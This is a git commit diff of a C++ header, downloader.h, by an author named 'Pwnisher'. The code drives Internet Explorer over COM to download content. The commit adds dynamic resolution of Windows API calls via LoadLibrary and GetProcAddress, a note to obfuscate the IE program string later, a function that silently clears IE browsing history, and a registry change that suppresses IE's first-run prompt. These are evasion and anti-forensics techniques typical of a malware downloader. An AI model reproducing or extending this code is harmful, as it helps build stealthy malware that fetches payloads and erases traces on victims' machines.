cc5f3c67ae8abc1c75727eaef8950d4dbfda982b
Pwnisher <ethancruize@gmail.com>
2021-02-09 01:51:31 +0530

    Update downloader.h

--- downloader.h
+++ downloader.h
@@ -1,26 +1,73 @@
-#include<Windows.h>
-#include<stdio.h>
+
+#include "headers.h"
+#include <comdef.h>
 #include <objbase.h>
-#include<combaseapi.h>
-#include <exdisp.h>
-#include <mshtml.h>
-#include <Urlhist.h>
 
 
 #pragma comment(lib, "Ole32.lib")
 #pragma comment(lib, "OleAut32.lib")
 
+
 // Manually adding CUrlHistory GUID
 const IID CLSID_CUrlHistory = { 0x3C374A40L, 0xBAE4, 0x11CF, 0xBF, 0x7D, 0x00, 0xAA, 0x00, 0x69, 0x46, 0xEE };
+
+
+
+typedef HRESULT(WINAPI* _CLSIDFromProgID)(
+	 LPCOLESTR lpszProgID,
+	 LPCLSID lpclsid
+);
+
+typedef HRESULT(WINAPI* _CoCreateInstance)(
+	REFCLSID rclsid, LPUNKNOWN pUnkOuter,
+	DWORD dwClsContext, 
+	REFIID riid, 
+	LPVOID FAR* ppv);
+
+
+
+typedef LSTATUS(WINAPI* _RegCreateKeyExA)(
+	HKEY                        hKey,
+	LPCSTR                      lpSubKey,
+	DWORD                       Reserved,
+	LPSTR                       lpClass,
+	DWORD                       dwOptions,
+	REGSAM                      samDesired,
+	const LPSECURITY_ATTRIBUTES lpSecurityAttributes,
+	PHKEY                       phkResult,
+	LPDWORD                     lpdwDisposition
+	);
+
+typedef LSTATUS(WINAPI* _RegSetValueExA)(
+	HKEY       hKey,
+	LPCSTR     lpValueName,
+	DWORD      Reserved,
+	DWORD      dwType,
+	const BYTE* lpData,
+	DWORD      cbData
+	);
+
+typedef LSTATUS(WINAPI* _RegCloseKey)(
+	HKEY hKey
+	);
+
 
 
 int history_cleanup() {
 
 	// Delete IE browser history
 	IUrlHistoryStg2* pIEHistory;
+	HMODULE OLE = LoadLibraryA("ole32.dll");
+
+	_CoCreateInstance CoCreateInst = (_CoCreateInstance)GetProcAddress(OLE, "CoCreateInstance");
+	if (CoCreateInst == NULL)
+	{
+		printf("Failed\n");
+		return 0;
+	}
 
 
-	HRESULT hr = CoCreateInstance(CLSID_CUrlHistory, NULL, CLSCTX_INPROC, IID_PPV_ARGS(&pIEHistory));
+	HRESULT hr = CoCreateInst(CLSID_CUrlHistory, NULL, CLSCTX_INPROC, IID_PPV_ARGS(&pIEHistory));
 
 	if (SUCCEEDED(hr)) {
 		pIEHistory->ClearHistory();
@@ -40,6 +87,7 @@ char* BSTRtoChar(BSTR String)
 {
 	int n, i;
 	char* FinalChar;
+
 	n = SysStringLen(String); // length of input
 	FinalChar = (char*)malloc(n + 1);
 	for (i = 0; i < n; i++)
@@ -51,21 +99,73 @@ char* BSTRtoChar(BSTR String)
 }
 
 
+
+BOOL disable_ie_prompt() {
+	// Dynamically resolve the API function from Advapi32.dll
+	HMODULE advapi32 = LoadLibraryA("Advapi32.dll");
+
+	_RegCreateKeyExA RegCreateKeyExA = (_RegCreateKeyExA)GetProcAddress(advapi32, "RegCreateKeyExA");
+	if (RegCreateKeyExA == NULL)
+		return FALSE;
+
+
+
+
+	_RegSetValueExA RegSetValueExA = (_RegSetValueExA)GetProcAddress(advapi32, "RegSetValueExA");
+	if (RegSetValueExA == NULL)
+		return FALSE;
+
+	_RegCloseKey RegCloseKey = (_RegCloseKey)GetProcAddress(advapi32, "RegCloseKey");
+	if (RegCloseKey == NULL)
+		return FALSE;
+
+	// Disable IE prompt
+	DWORD data = 1;
+	DWORD dwDisposition;
+	HKEY hKey;
+
+	RegCreateKeyExA(HKEY_CURRENT_USER, "Software\\Microsoft\\Internet Explorer\\Main", 0, NULL, REG_OPTION_NON_VOLATILE, KEY_ALL_ACCESS, NULL, &hKey, &dwDisposition);
+
+	if (RegSetValueExA(hKey, "DisableFirstRunCustomize", 0, REG_DWORD, reinterpret_cast<BYTE*>(&data), sizeof(data)) != ERROR_SUCCESS) {
+		RegCloseKey(hKey);
+		return FALSE;
+	}
+
+	RegCloseKey(hKey);
+
+	return TRUE;
+}
+
+
+
+
+
 char * download() {
 
 	// Disable IE First-use prompt 
 
 
+	disable_ie_prompt();
+
 	// we need clsid since we are doing COM 
 	CLSID clsid;
 
+	HMODULE OLE = LoadLibraryA("ole32.dll");
+	
 
 	// Initialize COM library
 	CoInitialize(NULL);
 
+
+
+
 	// Get clsid from ProgramID
-	// Makesure to Hash the "internetexplorer.app" string out later
-	if (CLSIDFromProgID(OLESTR("InternetExplorer.Application"), &clsid) != S_OK) {
+	// Makesure to obfuscate the "internetexplorer.app" string out later
+
+
+	_CLSIDFromProgID cidfrompid = (_CLSIDFromProgID)GetProcAddress(OLE, "CLSIDFromProgID");
+
+	if (cidfrompid(OLESTR("InternetExplorer.Application"), &clsid) != S_OK) {
 
 		// Handle errors reading COM error handling pattern
 		printf("IE COM Initialization Failed\n");
@@ -88,9 +188,17 @@ char * download() {
 	VARIANT_BOOL vBusy;
 	IDispatch* pDispatch = NULL;
 	IHTMLDocument2* pHTML = NULL;
+	
+	_CoCreateInstance CoCreateInst = (_CoCreateInstance)GetProcAddress(OLE, "CoCreateInstance");
+	if (CoCreateInst == NULL)
+	{
+		printf("Failed\n");
+		return 0;
+	}
 
 
-	if (CoCreateInstance(clsid, NULL, CLSCTX_LOCAL_SERVER, IID_IWebBrowser2, (LPVOID*)&pUnknown) != S_OK) {
+
+	if (CoCreateInst(clsid, NULL, CLSCTX_LOCAL_SERVER, IID_IWebBrowser2, (LPVOID*)&pUnknown) != S_OK) {
 
 		printf("Error\n");
 	}
